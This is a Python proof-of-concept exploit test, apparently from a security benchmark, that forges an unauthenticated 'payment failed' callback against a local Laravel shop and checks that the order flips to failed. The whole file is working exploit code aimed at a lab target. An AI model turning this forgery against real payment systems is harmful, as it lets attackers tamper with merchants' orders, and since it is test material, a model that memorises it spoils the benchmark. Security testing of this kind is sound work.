"""PoC exploit for forged failed payment callbacks on the Laravel shop."""

from mosaic.oracle.exploit import ExploitTest


class LaravelCallbackFailedTokenForgeryExploit(ExploitTest):
    """Demonstrate that a public failed callback can be forged without token."""

    def __init__(self, base_url: str = "http://localhost:9100"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "laravel_callback_failed_token_forgery"

    def setup(self) -> None:
        reset = self.http_post("/admin/reset")
        if not reset.ok:
            raise RuntimeError(
                f"Could not reset app state before exploit: "
                f"{reset.status_code} {reset.text[:200]}"
            )

    def execute(self) -> tuple[bool, str]:
        item_resp = self.http_get("/shop/items/SKU-001")
        if not item_resp.ok:
            return False, f"GET /shop/items/SKU-001 failed: {item_resp.status_code}"

        add_resp = self.http_post(
            "/shop/cart",
            json={"sku": "SKU-001", "quantity": 1},
        )
        if not add_resp.ok:
            return False, f"POST /shop/cart failed: {add_resp.status_code} {add_resp.text[:200]}"

        checkout_resp = self.http_post("/shop/checkout")
        if not checkout_resp.ok:
            return False, (
                f"POST /shop/checkout failed: {checkout_resp.status_code} "
                f"{checkout_resp.text[:200]}"
            )

        try:
            order = checkout_resp.json()["order"]
        except Exception as exc:
            return False, f"Could not parse checkout response: {exc}"

        order_id = order.get("id", "")
        initial_status = order.get("status", "")
        if not order_id:
            return False, f"Checkout response did not include an order id: {checkout_resp.text[:200]}"

        forged_resp = self.http_get(f"/shop/callback/payment/fail/{order_id}")
        if forged_resp.status_code in (404, 405):
            forged_resp = self.http_post(f"/shop/callback/payment/fail/{order_id}")

        if forged_resp.status_code == 400:
            return False, (
                f"Forged callback was rejected with 400, so the fail-token fallback "
                f"does not appear to be present. Body: {forged_resp.text[:200]}"
            )
        if not forged_resp.ok:
            return False, (
                f"Forged callback failed unexpectedly: {forged_resp.status_code} "
                f"{forged_resp.text[:200]}"
            )

        order_lookup = self.http_get(f"/shop/orders/{order_id}")
        if not order_lookup.ok:
            return False, f"GET /shop/orders/{order_id} failed: {order_lookup.status_code}"

        try:
            fetched_order = order_lookup.json()["order"]
        except Exception as exc:
            return False, f"Could not parse order lookup response: {exc}"

        final_status = fetched_order.get("status", "")
        callback_status = fetched_order.get("callback_status", "")

        if final_status == "failed" and callback_status == "fail":
            return True, (
                "Forged failed callback confirmed (CWE-345/CWE-287). "
                f"Order {order_id!r} started as {initial_status!r}, then a public "
                "request to /shop/callback/payment/fail/"
                f"{order_id} without shoptoken flipped it to failed. "
                "The callback endpoint fell back to the stored token instead of "
                "requiring the caller to present one."
            )

        return False, (
            f"Callback did not forge failure as expected. initial_status={initial_status!r}, "
            f"final_status={final_status!r}, callback_status={callback_status!r}, "
            f"response={forged_resp.status_code} {forged_resp.text[:200]}"
        )

